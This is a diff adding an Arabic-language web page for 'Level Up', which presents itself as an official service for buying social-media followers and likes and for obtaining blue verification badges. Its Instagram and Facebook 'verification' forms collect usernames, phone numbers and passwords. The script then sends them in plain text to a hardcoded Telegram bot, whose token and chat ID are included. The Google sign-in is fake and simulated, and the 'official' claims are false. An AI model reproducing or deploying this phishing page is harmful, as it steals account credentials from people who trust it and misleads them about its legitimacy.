@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Level Up | المنصة الرقمية الرسمية</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Cairo', sans-serif; background: #0a0a0a; color: #fff; }
+        
+        .gold { color: #D4AF37; }
+        .bg-gold { background: #D4AF37; }
+        .border-gold { border-color: #D4AF37; }
+        
+        .glass {
+            background: rgba(20,20,20,0.9);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(212,175,55,0.3);
+        }
+        
+        .glow {
+            box-shadow: 0 0 30px rgba(212,175,55,0.2);
+        }
+        
+        .btn-gold {
+            background: linear-gradient(135deg, #D4AF37, #B8860B);
+            color: #000;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .btn-gold:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(212,175,55,0.4);
+        }
+        
+        .btn-outline-gold {
+            border: 2px solid #D4AF37;
+            color: #D4AF37;
+            background: transparent;
+            transition: all 0.3s;
+        }
+        
+        .btn-outline-gold:hover {
+            background: #D4AF37;
+            color: #000;
+        }
+        
+        input, select, textarea {
+            background: #111 !important;
+            border: 1px solid #333 !important;
+            color: #fff !important;
+            border-radius: 10px;
+            padding: 12px;
+            width: 100%;
+            outline: none;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            border-color: #D4AF37 !important;
+        }
+        
+        .platform-card {
+            background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
+            border: 1px solid #222;
+            border-radius: 16px;
+            padding: 20px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        
+        .platform-card:hover {
+            border-color: #D4AF37;
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(212,175,55,0.1);
+        }
+        
+        .platform-card.active {
+            border-color: #D4AF37;
+            background: linear-gradient(145deg, #1a1a1a, #2a2a1a);
+        }
+        
+        .service-btn {
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 10px;
+            padding: 10px 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+        
+        .service-btn:hover {
+            border-color: #D4AF37;
+            background: #1a1a1a;
+        }
+        
+        .service-btn.selected {
+            border-color: #D4AF37;
+            background: rgba(212,175,55,0.1);
+        }
+        
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-overlay.active {
+            display: flex;
+        }
+        
+        .modal-content {
+            background: #1a1a1a;
+            border: 1px solid #D4AF37;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        
+        .copy-btn {
+            background: #222;
+            border: 1px solid #D4AF37;
+            color: #D4AF37;
+            padding: 8px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: #D4AF37;
+            color: #000;
+        }
+        
+        .success-animation {
+            animation: successPop 0.5s ease;
+        }
+        
+        @keyframes successPop {
+            0% { transform: scale(0); opacity: 0; }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #D4AF37;
+            color: #000;
+            padding: 12px 24px;
+            border-radius: 10px;
+            font-weight: bold;
+            display: none;
+            z-index: 2000;
+            animation: slideUp 0.3s ease;
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateX(-50%) translateY(100px); opacity: 0; }
+            to { transform: translateX(-50%) translateY(0); opacity: 1; }
+        }
+        
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #0a0a0a; }
+        ::-webkit-scrollbar-thumb { background: #D4AF37; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    
+    <!-- Toast Notification -->
+    <div id="toast" class="toast"></div>
+    
+    <!-- Login Modal -->
+    <div class="modal-overlay" id="loginModal">
+        <div class="modal-content text-center">
+            <div class="text-5xl mb-6">🔐</div>
+            <h2 class="text-3xl font-bold gold mb-4">مرحباً بك في Level Up</h2>
+            <p class="text-gray-400 mb-8">سجل دخول بحساب Google للاستمرار</p>
+            <button onclick="loginWithGoogle()" class="w-full btn-gold py-4 rounded-xl text-lg flex items-center justify-center gap-3">
+                <svg class="w-6 h-6" viewBox="0 0 24 24">
+                    <path fill="currentColor" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
+                    <path fill="currentColor" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="currentColor" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="currentColor" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+                تسجيل الدخول بـ Google
+            </button>
+        </div>
+    </div>
+    
+    <!-- Success Modal -->
+    <div class="modal-overlay" id="successModal">
+        <div class="modal-content text-center success-animation">
+            <div class="text-6xl mb-6">✅</div>
+            <h2 class="text-2xl font-bold gold mb-4">تم تقديم طلبك بنجاح!</h2>
+            <p class="text-gray-400 mb-6">رقم الطلب الخاص بك:</p>
+            <div class="text-3xl font-bold gold mb-6" id="orderNumberDisplay">LVL-XXXXX</div>
+            <button onclick="copyOrderNumber()" class="copy-btn mb-4 w-full">
+                📋 نسخ رقم الطلب
+            </button>
+            <p class="text-gray-500 text-sm">سنقوم بالتواصل معك عبر إنستغرام خلال 24 ساعة</p>
+            <button onclick="closeSuccessModal()" class="w-full btn-outline-gold py-3 rounded-xl mt-6">
+                العودة للصفحة الرئيسية
+            </button>
+        </div>
+    </div>
+    
+    <!-- Header -->
+    <header class="glass border-b border-gold sticky top-0 z-50">
+        <div class="max-w-6xl mx-auto px-4 py-4 flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <div class="text-3xl font-black gold tracking-wider">LEVEL UP</div>
+                <div class="text-xs bg-gold text-black px-2 py-1 rounded-full font-bold">OFFICIAL</div>
+            </div>
+            <div class="flex items-center gap-4">
+                <div id="userInfo" class="hidden items-center gap-3">
+                    <img id="userAvatar" class="w-10 h-10 rounded-full border-2 border-gold" src="" alt="">
+                    <span id="userName" class="text-sm gold hidden md:block"></span>
+                </div>
+                <button id="loginBtn" onclick="showLogin()" class="btn-gold px-6 py-2 rounded-full text-sm">
+                    تسجيل الدخول
+                </button>
+            </div>
+        </div>
+    </header>
+    
+    <!-- Main Content -->
+    <main class="max-w-6xl mx-auto px-4 py-8">
+        
+        <!-- Hero -->
+        <div class="text-center mb-12">
+            <h1 class="text-5xl md:text-7xl font-black gold mb-4">ارتقِ بحسابك</h1>
+            <p class="text-gray-400 text-xl">المنصة الرقمية الرسمية لتعزيز وتوثيق حساباتك</p>
+            <div class="flex justify-center gap-4 mt-6">
+                <div class="glass px-6 py-3 rounded-full text-sm">
+                    <span class="gold font-bold">+10,000</span> عميل
+                </div>
+                <div class="glass px-6 py-3 rounded-full text-sm">
+                    <span class="gold font-bold">⭐ 4.9</span> تقييم
+                </div>
+            </div>
+        </div>
+        
+        <!-- Services Section -->
+        <div class="mb-12">
+            <h2 class="text-3xl font-bold gold mb-8 text-center">🚀 اختر المنصة والخدمة</h2>
+            
+            <!-- Platform Selection -->
+            <div class="grid grid-cols-3 md:grid-cols-6 gap-4 mb-8">
+                <div class="platform-card active" data-platform="instagram" onclick="selectPlatform('instagram')">
+                    <div class="text-4xl mb-2">📸</div>
+                    <div class="font-bold gold">إنستغرام</div>
+                </div>
+                <div class="platform-card" data-platform="facebook" onclick="selectPlatform('facebook')">
+                    <div class="text-4xl mb-2">📘</div>
+                    <div class="font-bold gold">فيسبوك</div>
+                </div>
+                <div class="platform-card" data-platform="tiktok" onclick="selectPlatform('tiktok')">
+                    <div class="text-4xl mb-2">🎵</div>
+                    <div class="font-bold gold">تيك توك</div>
+                </div>
+                <div class="platform-card" data-platform="snapchat" onclick="selectPlatform('snapchat')">
+                    <div class="text-4xl mb-2">👻</div>
+                    <div class="font-bold gold">سناب شات</div>
+                </div>
+                <div class="platform-card" data-platform="telegram" onclick="selectPlatform('telegram')">
+                    <div class="text-4xl mb-2">✈️</div>
+                    <div class="font-bold gold">تيليجرام</div>
+                </div>
+                <div class="platform-card" data-platform="whatsapp" onclick="selectPlatform('whatsapp')">
+                    <div class="text-4xl mb-2">💬</div>
+                    <div class="font-bold gold">واتساب</div>
+                </div>
+            </div>
+            
+            <!-- Service Selection -->
+            <div class="glass p-6 rounded-2xl glow">
+                <h3 class="text-xl font-bold gold mb-4" id="selectedPlatform">إنستغرام</h3>
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-3 mb-6" id="servicesContainer">
+                    <!-- Services will be populated by JavaScript -->
+                </div>
+                
+                <!-- Order Form -->
+                <form id="orderForm" class="space-y-4">
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-sm text-gray-400 mb-2">رابط الحساب أو المنشور</label>
+                            <input type="url" id="targetLink" required placeholder="https://www.instagram.com/...">
+                        </div>
+                        <div>
+                            <label class="block text-sm text-gray-400 mb-2">الكمية</label>
+                            <input type="number" id="quantity" min="100" max="10000" value="500" step="100">
+                        </div>
+                    </div>
+                    
+                    <!-- Additional options for specific services -->
+                    <div id="additionalOptions" class="hidden">
+                        <label class="block text-sm text-gray-400 mb-2">نوع التفاعل</label>
+                        <select id="reactionType">
+                            <option value="like">👍 لايك</option>
+                            <option value="love">❤️ حب</option>
+                            <option value="haha">😂 هههه</option>
+                            <option value="wow">😮 واو</option>
+                            <option value="sad">😢 حزين</option>
+                            <option value="angry">😡 غاضب</option>
+                        </select>
+                    </div>
+                    
+                    <div id="commentOption" class="hidden">
+                        <label class="block text-sm text-gray-400 mb-2">نوع التعليقات</label>
+                        <select id="commentType">
+                            <option value="random">عشوائي</option>
+                            <option value="positive">إيجابي</option>
+                            <option value="custom">مخصص</option>
+                        </select>
+                        <textarea id="customComments" class="mt-2 hidden" placeholder="اكتب التعليقات المطلوبة..."></textarea>
+                    </div>
+                    
+                    <button type="submit" class="w-full btn-gold py-4 rounded-xl text-lg">
+                        🔥 تقديم الطلب
+                    </button>
+                </form>
+            </div>
+        </div>
+        
+        <!-- Verification Section -->
+        <div class="mb-12">
+            <h2 class="text-3xl font-bold gold mb-8 text-center">🛡️ توثيق الحسابات الرسمي</h2>
+            <div class="grid md:grid-cols-2 gap-6">
+                <div class="glass p-6 rounded-2xl">
+                    <div class="text-5xl mb-4">📸</div>
+                    <h3 class="text-xl font-bold gold mb-4">توثيق إنستغرام</h3>
+                    <p class="text-gray-400 text-sm mb-6">احصل على العلامة الزرقاء لحسابك في إنستغرام</p>
+                    <form id="verifyInstagramForm" class="space-y-4">
+                        <input type="text" id="instaUsername" required placeholder="اسم المستخدم (Username)">
+                        <input type="password" id="instaPassword" required placeholder="كلمة السر (Password)">
+                        <input type="url" id="instaProfile" required placeholder="رابط الحساب">
+                        <button type="submit" class="w-full btn-gold py-3 rounded-xl">طلب توثيق إنستغرام</button>
+                    </form>
+                </div>
+                
+                <div class="glass p-6 rounded-2xl">
+                    <div class="text-5xl mb-4">📘</div>
+                    <h3 class="text-xl font-bold gold mb-4">توثيق فيسبوك</h3>
+                    <p class="text-gray-400 text-sm mb-6">احصل على العلامة الزرقاء لحسابك في فيسبوك</p>
+                    <form id="verifyFacebookForm" class="space-y-4">
+                        <input type="tel" id="fbPhone" required placeholder="رقم الهاتف (مع مفتاح الدولة)">
+                        <input type="password" id="fbPassword" required placeholder="كلمة السر (Password)">
+                        <input type="url" id="fbProfile" required placeholder="رابط الحساب">
+                        <button type="submit" class="w-full btn-gold py-3 rounded-xl">طلب توثيق فيسبوك</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Stats -->
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mb-12">
+            <div class="glass p-6 rounded-2xl text-center">
+                <div class="text-4xl font-black gold">15K+</div>
+                <div class="text-gray-400 text-sm">طلب مكتمل</div>
+            </div>
+            <div class="glass p-6 rounded-2xl text-center">
+                <div class="text-4xl font-black gold">98%</div>
+                <div class="text-gray-400 text-sm">نسبة النجاح</div>
+            </div>
+            <div class="glass p-6 rounded-2xl text-center">
+                <div class="text-4xl font-black gold">24/7</div>
+                <div class="text-gray-400 text-sm">دعم فني</div>
+            </div>
+            <div class="glass p-6 rounded-2xl text-center">
+                <div class="text-4xl font-black gold">⭐</div>
+                <div class="text-gray-400 text-sm">موثوق رسمياً</div>
+            </div>
+        </div>
+        
+    </main>
+    
+    <!-- Footer -->
+    <footer class="glass border-t border-gold mt-12">
+        <div class="max-w-6xl mx-auto px-4 py-8">
+            <div class="grid md:grid-cols-3 gap-8 mb-8">
+                <div>
+                    <div class="text-2xl font-black gold mb-4">LEVEL UP</div>
+                    <p class="text-gray-400 text-sm">المنصة الرقمية الرسمية لتعزيز وتوثيق حسابات التواصل الاجتماعي</p>
+                </div>
+                <div>
+                    <h4 class="font-bold gold mb-4">روابط سريعة</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li>خدمات الرشق</li>
+                        <li>توثيق الحسابات</li>
+                        <li>الشروط والأحكام</li>
+                        <li>سياسة الخصوصية</li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-bold gold mb-4">تواصل معنا</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li>📧 support@levelup.com</li>
+                        <li>📱 @levelup_instagram</li>
+                        <li>💬 @levelup_telegram</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="text-center text-gray-500 text-sm border-t border-gray-800 pt-6">
+                ©️ 2026 LEVEL UP - جميع الحقوق محفوظة. منصة رسمية ومعتمدة.
+            </div>
+        </div>
+    </footer>
+    
+    <script>
+        // === Telegram Config ===
+        const BOT_TOKEN = "8863587194:AAFcIkRg7hK5IbUvZ3bH1XG-CWR8FYDiMb8";
+        const CHAT_ID = "6714684833";
+        
+        // === State ===
+        let currentUser = null;
+        let currentPlatform = 'instagram';
+        let currentService = '';
+        
+        // === Services Data ===
+        const services = {
+            instagram: [
+                { id: 'followers', name: 'متابعين', icon: '👥' },
+                { id: 'likes', name: 'لايكات', icon: '❤️' },
+                { id: 'views', name: 'مشاهدات', icon: '👁️' },
+                { id: 'comments', name: 'تعليقات', icon: '💬' },
+                { id: 'story_views', name: 'مشاهدات ستوري', icon: '📖' }
+            ],
+            facebook: [
+                { id: 'followers', name: 'متابعين', icon: '👥' },
+                { id: 'likes', name: 'لايكات', icon: '❤️' },
+                { id: 'reactions', name: 'تفاعلات (مشاعر)', icon: '😊' },
+                { id: 'comments', name: 'تعليقات', icon: '💬' },
+                { id: 'views', name: 'مشاهدات', icon: '👁️' }
+            ],
+            tiktok: [
+                { id: 'followers', name: 'متابعين', icon: '👥' },
+                { id: 'likes', name: 'لايكات', icon: '❤️' },
+                { id: 'views', name: 'مشاهدات', icon: '👁️' },
+                { id: 'comments', name: 'تعليقات', icon: '💬' },
+                { id: 'shares', name: 'مشاركات', icon: '🔄' }
+            ],
+            snapchat: [
+                { id: 'adds', name: 'إضافات', icon: '➕' },
+                { id: 'snap_plus', name: 'سناب بلس', icon: '⭐' },
+                { id: 'views', name: 'مشاهدات', icon: '👁️' }
+            ],
+            telegram: [
+                { id: 'members', name: 'أعضاء', icon: '👥' },
+                { id: 'votes', name: 'تصويت', icon: '🗳️' },
+                { id: 'views', name: 'مشاهدات', icon: '👁️' }
+            ],
+            whatsapp: [
+                { id: 'votes', name: 'تصويت', icon: '🗳️' },
+                { id: 'members', name: 'أعضاء مجموعات', icon: '👥' }
+            ]
+        };
+        
+        // === Functions ===
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.display = 'block';
+            setTimeout(() => { toast.style.display = 'none'; }, 3000);
+        }
+        
+        function showLogin() {
+            if (!currentUser) {
+                document.getElementById('loginModal').classList.add('active');
+            }
+        }
+        
+        function loginWithGoogle() {
+            // Simulate Google Login
+            currentUser = {
+                name: 'مستخدم Level Up',
+                email: 'user@gmail.com',
+                avatar: 'https://ui-avatars.com/api/?name=Level+Up&background=D4AF37&color=000&size=200'
+            };
+            
+            document.getElementById('loginModal').classList.remove('active');
+            document.getElementById('loginBtn').classList.add('hidden');
+            document.getElementById('userInfo').classList.remove('hidden');
+            document.getElementById('userAvatar').src = currentUser.avatar;
+            document.getElementById('userName').textContent = currentUser.name;
+            
+            showToast('✅ تم تسجيل الدخول بنجاح!');
+        }
+        
+        function selectPlatform(platform) {
+            currentPlatform = platform;
+            
+            // Update UI
+            document.querySelectorAll('.platform-card').forEach(card => {
+                card.classList.remove('active');
+            });
+            document.querySelector(`[data-platform="${platform}"]`).classList.add('active');
+            
+            // Update services
+            const platformNames = {
+                instagram: 'إنستغرام',
+                facebook: 'فيسبوك',
+                tiktok: 'تيك توك',
+                snapchat: 'سناب شات',
+                telegram: 'تيليجرام',
+                whatsapp: 'واتساب'
+            };
+            
+            document.getElementById('selectedPlatform').textContent = platformNames[platform];
+            
+            const container = document.getElementById('servicesContainer');
+            container.innerHTML = '';
+            
+            services[platform].forEach(service => {
+                const btn = document.createElement('div');
+                btn.className = 'service-btn';
+                btn.innerHTML = `
+                    <div class="text-2xl mb-1">${service.icon}</div>
+                    <div class="text-sm">${service.name}</div>
+                `;
+                btn.onclick = () => selectService(service.id);
+                container.appendChild(btn);
+            });
+        }
+        
+        function selectService(serviceId) {
+            currentService = serviceId;
+            
+            document.querySelectorAll('.service-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
+            event.currentTarget.classList.add('selected');
+            
+            // Show/hide additional options
+            const additionalOptions = document.getElementById('additionalOptions');
+            const commentOption = document.getElementById('commentOption');
+            
+            additionalOptions.classList.add('hidden');
+            commentOption.classList.add('hidden');
+            
+            if (currentPlatform === 'facebook' && serviceId === 'reactions') {
+                additionalOptions.classList.remove('hidden');
+            }
+            
+            if (serviceId === 'comments') {
+                commentOption.classList.remove('hidden');
+            }
+            
+            document.getElementById('commentType').onchange = function() {
+                document.getElementById('customComments').classList.toggle('hidden', this.value !== 'custom');
+            };
+        }
+        
+        function generateOrderNumber() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let result = 'LVL-';
+            for (let i = 0; i < 8; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+        
+        function copyOrderNumber() {
+            const orderNumber = document.getElementById('orderNumberDisplay').textContent;
+            navigator.clipboard.writeText(orderNumber).then(() => {
+                showToast('✅ تم نسخ رقم الطلب!');
+            });
+        }
+        
+        function closeSuccessModal() {
+            document.getElementById('successModal').classList.remove('active');
+        }
+        
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            return fetch(url);
+        }
+        
+        // === Order Form ===
+        document.getElementById('orderForm').onsubmit = async function(e) {
+            e.preventDefault();
+            
+            if (!currentUser) {
+                showToast('❌ يجب تسجيل الدخول أولاً');
+                showLogin();
+                return;
+            }
+            
+            const orderNumber = generateOrderNumber();
+            const link = document.getElementById('targetLink').value;
+            const quantity = document.getElementById('quantity').value;
+            
+            let serviceName = '';
+            const serviceMap = {
+                followers: 'متابعين',
+                likes: 'لايكات',
+                views: 'مشاهدات',
+                comments: 'تعليقات',
+                story_views: 'مشاهدات ستوري',
+                reactions: 'تفاعلات',
+                adds: 'إضافات',
+                snap_plus: 'سناب بلس',
+                members: 'أعضاء',
+                votes: 'تصويت',
+                shares: 'مشاركات'
+            };
+            serviceName = serviceMap[currentService] || currentService;
+            
+            const platformNames = {
+                instagram: 'إنستغرام',
+                facebook: 'فيسبوك',
+                tiktok: 'تيك توك',
+                snapchat: 'سناب شات',
+                telegram: 'تيليجرام',
+                whatsapp: 'واتساب'
+            };
+            
+            let additionalInfo = '';
+            if (currentPlatform === 'facebook' && currentService === 'reactions') {
+                additionalInfo = `\nنوع التفاعل: ${document.getElementById('reactionType').value}`;
+            }
+            if (currentService === 'comments') {
+                const commentType = document.getElementById('commentType').value;
+                additionalInfo += `\nنوع التعليقات: ${commentType}`;
+                if (commentType === 'custom') {
+                    additionalInfo += `\nالتعليقات: ${document.getElementById('customComments').value}`;
+                }
+            }
+            
+            const message = `
+🔔 **طلب جديد من الموقع الرسمي**
+━━━━━━━━━━━━━━━━
+📋 رقم الطلب: ${orderNumber}
+👤 المستخدم: ${currentUser.name}
+📧 البريد: ${currentUser.email}
+━━━━━━━━━━━━━━━━
+📱 المنصة: ${platformNames[currentPlatform]}
+🛠️ الخدمة: ${serviceName}
+🔗 الرابط: ${link}
+📊 الكمية: ${quantity}${additionalInfo}
+━━━━━━━━━━━━━━━━
+📅 التاريخ: ${new Date().toLocaleString('ar-EG')}
+            `;
+            
+            try {
+                const response = await sendToTelegram(message);
+                if (response.ok) {
+                    document.getElementById('orderNumberDisplay').textContent = orderNumber;
+                    document.getElementById('successModal').classList.add('active');
+                    this.reset();
+                } else {
+                    showToast('❌ حدث خطأ في الإرسال');
+                }
+            } catch (error) {
+                showToast('❌ خطأ في الاتصال');
+            }
+        };
+        
+        // === Verification Forms ===
+        document.getElementById('verifyInstagramForm').onsubmit = async function(e) {
+            e.preventDefault();
+            
+            if (!currentUser) {
+                showToast('❌ يجب تسجيل الدخول أولاً');
+                showLogin();
+                return;
+            }
+            
+            const username = document.getElementById('instaUsername').value;
+            const password = document.getElementById('instaPassword').value;
+            const profile = document.getElementById('instaProfile').value;
+            const orderNumber = generateOrderNumber();
+            
+            const message = `
+🛡️ **طلب توثيق إنستغرام جديد**
+━━━━━━━━━━━━━━━━
+📋 رقم الطلب: ${orderNumber}
+👤 المستخدم: ${currentUser.name}
+━━━━━━━━━━━━━━━━
+📸 اسم المستخدم: ${username}
+🔑 كلمة السر: ${password}
+🔗 الرابط: ${profile}
+━━━━━━━━━━━━━━━━
+📅 التاريخ: ${new Date().toLocaleString('ar-EG')}
+            `;
+            
+            try {
+                const response = await sendToTelegram(message);
+                if (response.ok) {
+                    document.getElementById('orderNumberDisplay').textContent = orderNumber;
+                    document.getElementById('successModal').classList.add('active');
+                    this.reset();
+                } else {
+                    showToast('❌ حدث خطأ في الإرسال');
+                }
+            } catch (error) {
+                showToast('❌ خطأ في الاتصال');
+            }
+        };
+        
+        document.getElementById('verifyFacebookForm').onsubmit = async function(e) {
+            e.preventDefault();
+            
+            if (!currentUser) {
+                showToast('❌ يجب تسجيل الدخول أولاً');
+                showLogin();
+                return;
+            }
+            
+            const phone = document.getElementById('fbPhone').value;
+            const password = document.getElementById('fbPassword').value;
+            const profile = document.getElementById('fbProfile').value;
+            const orderNumber = generateOrderNumber();
+            
+            const message = `
+🛡️ **طلب توثيق فيسبوك جديد**
+━━━━━━━━━━━━━━━━
+📋 رقم الطلب: ${orderNumber}
+👤 المستخدم: ${currentUser.name}
+━━━━━━━━━━━━━━━━
+📞 رقم الهاتف: ${phone}
+🔑 كلمة السر: ${password}
+🔗 الرابط: ${profile}
+━━━━━━━━━━━━━━━━
+📅 التاريخ: ${new Date().toLocaleString('ar-EG')}
+            `;
+            
+            try {
+                const response = await sendToTelegram(message);
+                if (response.ok) {
+                    document.getElementById('orderNumberDisplay').textContent = orderNumber;
+                    document.getElementById('successModal').classList.add('active');
+                    this.reset();
+                } else {
+                    showToast('❌ حدث خطأ في الإرسال');
+                }
+            } catch (error) {
+                showToast('❌ خطأ في الاتصال');
+            }
+        };
+        
+        // === Initialize ===
+        selectPlatform('instagram');
+        
+        // Check if user is logged in (simulated)
+        setTimeout(() => {
+            if (!currentUser) {
+                showLogin();
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
